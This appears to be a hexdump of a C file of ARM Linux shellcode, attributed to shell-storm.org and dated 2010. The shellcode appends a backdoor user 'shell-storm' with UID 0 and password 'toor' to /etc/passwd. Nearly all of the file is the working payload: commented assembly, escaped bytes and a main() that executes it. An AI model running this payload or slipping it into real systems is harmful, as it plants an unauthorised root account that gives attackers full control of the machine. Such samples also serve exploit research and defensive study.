00000000  2f 2a 0a 2a 2a 20 54 69  74 6c 65 3a 20 20 20 20  |/*.** Title:    |
00000010  20 4c 69 6e 75 78 2f 41  52 4d 20 2d 20 61 64 64  | Linux/ARM - add|
00000020  20 72 6f 6f 74 20 75 73  65 72 20 77 69 74 68 20  | root user with |
00000030  70 61 73 73 77 6f 72 64  20 2d 20 31 35 31 20 62  |password - 151 b|
00000040  79 74 65 73 0a 2a 2a 20  44 61 74 65 3a 20 20 20  |ytes.** Date:   |
00000050  20 20 20 32 30 31 30 2d  31 31 2d 32 35 0a 2a 2a  |   2010-11-25.**|
00000060  20 54 65 73 74 65 64 20  6f 6e 3a 20 41 52 4d 39  | Tested on: ARM9|
00000070  32 36 45 4a 2d 53 20 72  65 76 20 35 20 28 76 35  |26EJ-S rev 5 (v5|
00000080  6c 29 0a 2a 2a 20 41 75  74 68 6f 72 3a 20 20 20  |l).** Author:   |
00000090  20 4a 6f 6e 61 74 68 61  6e 20 53 61 6c 77 61 6e  | Jonathan Salwan|
000000a0  20 2d 20 74 77 69 74 74  65 72 3a 20 40 6a 6f 6e  | - twitter: @jon|
000000b0  61 74 68 61 6e 73 61 6c  77 61 6e 0a 2a 2a 0a 2a  |athansalwan.**.*|
000000c0  2a 20 68 74 74 70 3a 2f  2f 73 68 65 6c 6c 2d 73  |* http://shell-s|
000000d0  74 6f 72 6d 2e 6f 72 67  0a 2a 2a 0a 2a 2a 20 49  |torm.org.**.** I|
000000e0  6e 66 6f 72 6d 61 74 69  6f 6e 73 3a 0a 2a 2a 20  |nformations:.** |
000000f0  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 0a 2a 2a  |-------------.**|
00000100  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 2d  |               -|
00000110  20 75 73 65 72 3a 20 73  68 65 6c 6c 2d 73 74 6f  | user: shell-sto|
00000120  72 6d 0a 2a 2a 20 20 20  20 20 20 20 20 20 20 20  |rm.**           |
00000130  20 20 20 20 2d 20 70 73  77 64 3a 20 74 6f 6f 72  |    - pswd: toor|
00000140  0a 2a 2a 20 20 20 20 20  20 20 20 20 20 20 20 20  |.**             |
00000150  20 20 2d 20 75 69 64 20  3a 20 30 0a 2a 2f 0a 0a  |  - uid : 0.*/..|
00000160  23 69 6e 63 6c 75 64 65  20 3c 73 74 64 69 6f 2e  |#include <stdio.|
00000170  68 3e 0a 0a 0a 63 68 61  72 20 53 43 5b 5d 20 3d  |h>...char SC[] =|
00000180  20 0a 20 20 20 20 20 20  20 20 20 20 20 20 2f 2a  | .            /*|
00000190  20 54 68 75 6d 62 20 6d  6f 64 65 20 2a 2f 0a 20  | Thumb mode */. |
000001a0  20 20 20 20 20 20 20 20  20 20 20 22 5c 78 30 35  |           "\x05|
000001b0  5c 78 35 30 5c 78 34 35  5c 78 65 30 22 20 20 2f  |\x50\x45\xe0"  /|
000001c0  2a 20 73 75 62 20 20 72  35 2c 20 72 35 2c 20 72  |* sub  r5, r5, r|
000001d0  35 20 2a 2f 0a 20 20 20  20 20 20 20 20 20 20 20  |5 */.           |
000001e0  20 22 5c 78 30 31 5c 78  35 30 5c 78 38 66 5c 78  | "\x01\x50\x8f\x|
000001f0  65 32 22 20 20 2f 2a 20  61 64 64 20 20 72 35 2c  |e2"  /* add  r5,|
00000200  20 70 63 2c 20 23 31 20  2a 2f 0a 20 20 20 20 20  | pc, #1 */.     |
00000210  20 20 20 20 20 20 20 22  5c 78 31 35 5c 78 66 66  |       "\x15\xff|
00000220  5c 78 32 66 5c 78 65 31  22 20 20 2f 2a 20 62 78  |\x2f\xe1"  /* bx|
00000230  20 20 20 72 35 20 2a 2f  0a 0a 20 20 20 20 20 20  |   r5 */..      |
00000240  20 20 20 20 20 20 2f 2a  20 6f 70 65 6e 28 22 2f  |      /* open("/|
00000250  65 74 63 2f 70 61 73 73  77 64 22 2c 20 4f 5f 57  |etc/passwd", O_W|
00000260  52 4f 4e 4c 59 7c 4f 5f  43 52 45 41 54 7c 4f 5f  |RONLY|O_CREAT|O_|
00000270  41 50 50 45 4e 44 2c 20  30 36 34 34 29 20 3d 20  |APPEND, 0644) = |
00000280  66 64 20 2a 2f 0a 20 20  20 20 20 20 20 20 20 20  |fd */.          |
00000290  20 20 22 5c 78 37 38 5c  78 34 36 22 20 20 20 20  |  "\x78\x46"    |
000002a0  20 20 20 20 20 20 2f 2a  20 6d 6f 76 20 20 72 30  |      /* mov  r0|
000002b0  2c 20 70 63 20 2a 2f 0a  20 20 20 20 20 20 20 20  |, pc */.        |
000002c0  20 20 20 20 22 5c 78 37  43 5c 78 33 30 22 20 20  |    "\x7C\x30"  |
000002d0  20 20 20 20 20 20 20 20  2f 2a 20 61 64 64 73 20  |        /* adds |
000002e0  72 30 2c 20 23 31 32 34  20 2a 2f 0a 20 20 20 20  |r0, #124 */.    |
000002f0  20 20 20 20 20 20 20 20  22 5c 78 66 66 5c 78 32  |        "\xff\x2|
00000300  31 22 20 20 20 20 20 20  20 20 20 20 2f 2a 20 6d  |1"          /* m|
00000310  6f 76 73 20 72 31 2c 20  23 32 35 35 20 2a 2f 0a  |ovs r1, #255 */.|
00000320  20 20 20 20 20 20 20 20  20 20 20 20 22 5c 78 66  |            "\xf|
00000330  66 5c 78 33 31 22 20 20  20 20 20 20 20 20 20 20  |f\x31"          |
00000340  2f 2a 20 61 64 64 73 20  72 31 2c 20 23 32 35 35  |/* adds r1, #255|
00000350  20 2a 2f 0a 20 20 20 20  20 20 20 20 20 20 20 20  | */.            |
00000360  22 5c 78 66 66 5c 78 33  31 22 20 20 20 20 20 20  |"\xff\x31"      |
00000370  20 20 20 20 2f 2a 20 61  64 64 73 20 72 31 2c 20  |    /* adds r1, |
00000380  23 32 35 35 20 2a 2f 0a  20 20 20 20 20 20 20 20  |#255 */.        |
00000390  20 20 20 20 22 5c 78 66  66 5c 78 33 31 22 20 20  |    "\xff\x31"  |
000003a0  20 20 20 20 20 20 20 20  2f 2a 20 61 64 64 73 20  |        /* adds |
000003b0  72 31 2c 20 23 32 35 35  20 2a 2f 0a 20 20 20 20  |r1, #255 */.    |
000003c0  20 20 20 20 20 20 20 20  22 5c 78 34 35 5c 78 33  |        "\x45\x3|
000003d0  31 22 20 20 20 20 20 20  20 20 20 20 2f 2a 20 61  |1"          /* a|
000003e0  64 64 73 20 72 31 2c 20  23 36 39 20 2a 2f 0a 20  |dds r1, #69 */. |
000003f0  20 20 20 20 20 20 20 20  20 20 20 22 5c 78 64 63  |           "\xdc|
00000400  5c 78 32 32 22 20 20 20  20 20 20 20 20 20 20 2f  |\x22"          /|
00000410  2a 20 6d 6f 76 73 20 72  32 2c 20 23 32 32 30 20  |* movs r2, #220 |
00000420  2a 2f 0a 20 20 20 20 20  20 20 20 20 20 20 20 22  |*/.            "|
00000430  5c 78 63 38 5c 78 33 32  22 20 20 20 20 20 20 20  |\xc8\x32"       |
00000440  20 20 20 2f 2a 20 61 64  64 73 20 72 32 2c 20 23  |   /* adds r2, #|
00000450  32 30 30 20 2a 2f 0a 20  20 20 20 20 20 20 20 20  |200 */.         |
00000460  20 20 20 22 5c 78 30 35  5c 78 32 37 22 20 20 20  |   "\x05\x27"   |
00000470  20 20 20 20 20 20 20 2f  2a 20 6d 6f 76 73 20 72  |       /* movs r|
00000480  37 2c 20 23 35 20 2a 2f  0a 20 20 20 20 20 20 20  |7, #5 */.       |
00000490  20 20 20 20 20 22 5c 78  30 31 5c 78 64 66 22 20  |     "\x01\xdf" |
000004a0  20 20 20 20 20 20 20 20  20 2f 2a 20 73 76 63 20  |         /* svc |
000004b0  20 31 20 2a 2f 0a 0a 20  20 20 20 20 20 20 20 20  | 1 */..         |
000004c0  20 20 20 2f 2a 20 72 38  20 3d 20 66 64 20 2a 2f  |   /* r8 = fd */|
000004d0  0a 20 20 20 20 20 20 20  20 20 20 20 20 22 5c 78  |.            "\x|
000004e0  38 30 5c 78 34 36 22 20  20 20 20 20 20 20 20 20  |80\x46"         |
000004f0  20 2f 2a 20 6d 6f 76 20  20 72 38 2c 20 72 30 20  | /* mov  r8, r0 |
00000500  2a 2f 0a 0a 20 20 20 20  20 20 20 20 20 20 20 20  |*/..            |
00000510  2f 2a 20 77 72 69 74 65  28 66 64 2c 20 22 73 68  |/* write(fd, "sh|
00000520  65 6c 6c 2d 73 74 6f 72  6d 3a 24 31 24 4b 51 59  |ell-storm:$1$KQY|
00000530  6c 2f 79 72 75 24 50 4d  74 30 32 7a 55 54 57 22  |l/yru$PMt02zUTW"|
00000540  2e 2e 2e 2c 20 37 32 29  20 2a 2f 0a 20 20 20 20  |..., 72) */.    |
00000550  20 20 20 20 20 20 20 20  22 5c 78 34 31 5c 78 34  |        "\x41\x4|
00000560  36 22 20 20 20 20 20 20  20 20 20 20 2f 2a 20 6d  |6"          /* m|
00000570  6f 76 20 20 72 31 2c 20  72 38 20 2a 2f 0a 20 20  |ov  r1, r8 */.  |
00000580  20 20 20 20 20 20 20 20  20 20 22 5c 78 30 38 5c  |          "\x08\|
00000590  78 31 63 22 20 20 20 20  20 20 20 20 20 20 2f 2a  |x1c"          /*|
000005a0  20 61 64 64 73 20 72 30  2c 20 72 31 2c 20 23 30  | adds r0, r1, #0|
000005b0  20 2a 2f 0a 20 20 20 20  20 20 20 20 20 20 20 20  | */.            |
000005c0  22 5c 78 37 39 5c 78 34  36 22 20 20 20 20 20 20  |"\x79\x46"      |
000005d0  20 20 20 20 2f 2a 20 6d  6f 76 20 20 72 31 2c 20  |    /* mov  r1, |
000005e0  70 63 20 2a 2f 0a 20 20  20 20 20 20 20 20 20 20  |pc */.          |
000005f0  20 20 22 5c 78 31 38 5c  78 33 31 22 20 20 20 20  |  "\x18\x31"    |
00000600  20 20 20 20 20 20 2f 2a  20 61 64 64 73 20 72 31  |      /* adds r1|
00000610  2c 20 23 32 34 20 2a 2f  0a 20 20 20 20 20 20 20  |, #24 */.       |
00000620  20 20 20 20 20 22 5c 78  63 30 5c 78 34 36 22 20  |     "\xc0\x46" |
00000630  20 20 20 20 20 20 20 20  20 2f 2a 20 6e 6f 70 20  |         /* nop |
00000640  28 6d 6f 76 20 72 38 2c  20 72 38 29 20 2a 2f 0a  |(mov r8, r8) */.|
00000650  20 20 20 20 20 20 20 20  20 20 20 20 22 5c 78 34  |            "\x4|
00000660  38 5c 78 32 32 22 20 20  20 20 20 20 20 20 20 20  |8\x22"          |
00000670  2f 2a 20 6d 6f 76 73 20  72 32 2c 20 23 37 32 20  |/* movs r2, #72 |
00000680  2a 2f 0a 20 20 20 20 20  20 20 20 20 20 20 20 22  |*/.            "|
00000690  5c 78 30 34 5c 78 32 37  22 20 20 20 20 20 20 20  |\x04\x27"       |
000006a0  20 20 20 2f 2a 20 6d 6f  76 73 20 72 37 2c 20 23  |   /* movs r7, #|
000006b0  34 20 2a 2f 0a 20 20 20  20 20 20 20 20 20 20 20  |4 */.           |
000006c0  20 22 5c 78 30 31 5c 78  64 66 22 20 20 20 20 20  | "\x01\xdf"     |
000006d0  20 20 20 20 20 2f 2a 20  73 76 63 20 20 31 20 2a  |     /* svc  1 *|
000006e0  2f 0a 0a 20 20 20 20 20  20 20 20 20 20 20 20 2f  |/..            /|
000006f0  2a 20 63 6c 6f 73 65 28  66 64 29 20 2a 2f 0a 20  |* close(fd) */. |
00000700  20 20 20 20 20 20 20 20  20 20 20 22 5c 78 34 31  |           "\x41|
00000710  5c 78 34 36 22 20 20 20  20 20 20 20 20 20 20 2f  |\x46"          /|
00000720  2a 20 6d 6f 76 20 20 72  31 2c 20 72 38 20 2a 2f  |* mov  r1, r8 */|
00000730  0a 20 20 20 20 20 20 20  20 20 20 20 20 22 5c 78  |.            "\x|
00000740  30 38 5c 78 31 63 22 20  20 20 20 20 20 20 20 20  |08\x1c"         |
00000750  20 2f 2a 20 61 64 64 73  20 72 30 2c 20 72 31 2c  | /* adds r0, r1,|
00000760  20 23 30 20 2a 2f 0a 20  20 20 20 20 20 20 20 20  | #0 */.         |
00000770  20 20 20 22 5c 78 30 36  5c 78 32 37 22 20 20 20  |   "\x06\x27"   |
00000780  20 20 20 20 20 20 20 2f  2a 20 6d 6f 76 73 20 72  |       /* movs r|
00000790  37 2c 20 23 36 20 2a 2f  0a 20 20 20 20 20 20 20  |7, #6 */.       |
000007a0  20 20 20 20 20 22 5c 78  30 31 5c 78 64 66 22 20  |     "\x01\xdf" |
000007b0  20 20 20 20 20 20 20 20  20 2f 2a 20 73 76 63 20  |         /* svc |
000007c0  20 31 20 2a 2f 0a 0a 20  20 20 20 20 20 20 20 20  | 1 */..         |
000007d0  20 20 20 2f 2a 20 65 78  69 74 28 30 29 20 2a 2f  |   /* exit(0) */|
000007e0  0a 20 20 20 20 20 20 20  20 20 20 20 20 22 5c 78  |.            "\x|
000007f0  31 61 5c 78 34 39 22 20  20 20 20 20 20 20 20 20  |1a\x49"         |
00000800  20 2f 2a 20 73 75 62 73  20 72 31 2c 20 72 31 2c  | /* subs r1, r1,|
00000810  20 72 31 20 2a 2f 0a 20  20 20 20 20 20 20 20 20  | r1 */.         |
00000820  20 20 20 22 5c 78 30 38  5c 78 31 63 22 20 20 20  |   "\x08\x1c"   |
00000830  20 20 20 20 20 20 20 2f  2a 20 61 64 64 73 20 72  |       /* adds r|
00000840  30 2c 20 72 31 2c 20 23  30 20 2a 2f 0a 20 20 20  |0, r1, #0 */.   |
00000850  20 20 20 20 20 20 20 20  20 22 5c 78 30 31 5c 78  |         "\x01\x|
00000860  32 37 22 20 20 20 20 20  20 20 20 20 20 2f 2a 20  |27"          /* |
00000870  6d 6f 76 73 20 72 37 2c  20 23 31 20 2a 2f 0a 20  |movs r7, #1 */. |
00000880  20 20 20 20 20 20 20 20  20 20 20 22 5c 78 30 31  |           "\x01|
00000890  5c 78 64 66 22 20 20 20  20 20 20 20 20 20 20 2f  |\xdf"          /|
000008a0  2a 20 73 76 63 20 20 31  20 2a 2f 0a 0a 20 20 20  |* svc  1 */..   |
000008b0  20 20 20 20 20 20 20 20  20 2f 2a 20 73 68 65 6c  |         /* shel|
000008c0  6c 2d 73 74 6f 72 6d 3a  24 31 24 4b 51 59 6c 2f  |l-storm:$1$KQYl/|
000008d0  79 72 75 24 50 4d 74 30  32 7a 55 54 57 6d 4d 76  |yru$PMt02zUTWmMv|
000008e0  50 57 63 55 34 6f 51 4c  73 2f 3a 30 3a 30 3a 72  |PWcU4oQLs/:0:0:r|
000008f0  6f 6f 74 3a 2f 72 6f 6f  74 3a 2f 62 69 6e 2f 62  |oot:/root:/bin/b|
00000900  61 73 68 5c 6e 20 2a 2f  0a 20 20 20 20 20 20 20  |ash\n */.       |
00000910  20 20 20 20 20 22 5c 78  37 33 5c 78 36 38 5c 78  |     "\x73\x68\x|
00000920  36 35 5c 78 36 63 5c 78  36 63 5c 78 32 64 5c 78  |65\x6c\x6c\x2d\x|
00000930  37 33 5c 78 37 34 5c 78  36 66 5c 78 37 32 22 0a  |73\x74\x6f\x72".|
00000940  20 20 20 20 20 20 20 20  20 20 20 20 22 5c 78 36  |            "\x6|
00000950  64 5c 78 33 61 5c 78 32  34 5c 78 33 31 5c 78 32  |d\x3a\x24\x31\x2|
00000960  34 5c 78 34 62 5c 78 35  31 5c 78 35 39 5c 78 36  |4\x4b\x51\x59\x6|
00000970  63 5c 78 32 66 22 0a 20  20 20 20 20 20 20 20 20  |c\x2f".         |
00000980  20 20 20 22 5c 78 37 39  5c 78 37 32 5c 78 37 35  |   "\x79\x72\x75|
00000990  5c 78 32 34 5c 78 35 30  5c 78 34 64 5c 78 37 34  |\x24\x50\x4d\x74|
000009a0  5c 78 33 30 5c 78 33 32  5c 78 37 61 22 0a 20 20  |\x30\x32\x7a".  |
000009b0  20 20 20 20 20 20 20 20  20 20 22 5c 78 35 35 5c  |          "\x55\|
000009c0  78 35 34 5c 78 35 37 5c  78 36 64 5c 78 34 64 5c  |x54\x57\x6d\x4d\|
000009d0  78 37 36 5c 78 35 30 5c  78 35 37 5c 78 36 33 5c  |x76\x50\x57\x63\|
000009e0  78 35 35 22 0a 20 20 20  20 20 20 20 20 20 20 20  |x55".           |
000009f0  20 22 5c 78 33 34 5c 78  36 66 5c 78 35 31 5c 78  | "\x34\x6f\x51\x|
00000a00  34 63 5c 78 37 33 5c 78  32 66 5c 78 33 61 5c 78  |4c\x73\x2f\x3a\x|
00000a10  33 30 5c 78 33 61 5c 78  33 30 22 0a 20 20 20 20  |30\x3a\x30".    |
00000a20  20 20 20 20 20 20 20 20  22 5c 78 33 61 5c 78 37  |        "\x3a\x7|
00000a30  32 5c 78 36 66 5c 78 36  66 5c 78 37 34 5c 78 33  |2\x6f\x6f\x74\x3|
00000a40  61 5c 78 32 66 5c 78 37  32 5c 78 36 66 5c 78 36  |a\x2f\x72\x6f\x6|
00000a50  66 22 0a 20 20 20 20 20  20 20 20 20 20 20 20 22  |f".            "|
00000a60  5c 78 37 34 5c 78 33 61  5c 78 32 66 5c 78 36 32  |\x74\x3a\x2f\x62|
00000a70  5c 78 36 39 5c 78 36 65  5c 78 32 66 5c 78 36 32  |\x69\x6e\x2f\x62|
00000a80  5c 78 36 31 5c 78 37 33  22 0a 20 20 20 20 20 20  |\x61\x73".      |
00000a90  20 20 20 20 20 20 22 5c  78 36 38 5c 78 30 61 22  |      "\x68\x0a"|
00000aa0  0a 0a 20 20 20 20 20 20  20 20 20 20 20 20 2f 2a  |..            /*|
00000ab0  20 2f 65 74 63 2f 70 61  73 73 77 64 20 2a 2f 0a  | /etc/passwd */.|
00000ac0  20 20 20 20 20 20 20 20  20 20 20 20 22 5c 78 32  |            "\x2|
00000ad0  66 5c 78 36 35 5c 78 37  34 5c 78 36 33 5c 78 32  |f\x65\x74\x63\x2|
00000ae0  66 5c 78 37 30 5c 78 36  31 5c 78 37 33 5c 78 37  |f\x70\x61\x73\x7|
00000af0  33 5c 78 37 37 5c 78 36  34 22 3b 0a 0a 0a 69 6e  |3\x77\x64";...in|
00000b00  74 20 6d 61 69 6e 28 76  6f 69 64 29 0a 7b 0a 20  |t main(void).{. |
00000b10  20 20 20 20 20 20 20 66  70 72 69 6e 74 66 28 73  |       fprintf(s|
00000b20  74 64 6f 75 74 2c 22 4c  65 6e 67 74 68 3a 20 25  |tdout,"Length: %|
00000b30  64 5c 6e 22 2c 73 74 72  6c 65 6e 28 53 43 29 29  |d\n",strlen(SC))|
00000b40  3b 0a 20 20 20 20 20 20  20 20 28 2a 28 76 6f 69  |;.        (*(voi|
00000b50  64 28 2a 29 28 29 29 20  53 43 29 28 29 3b 0a 72  |d(*)()) SC)();.r|
00000b60  65 74 75 72 6e 20 30 3b  0a 7d                    |eturn 0;.}|
00000b6a
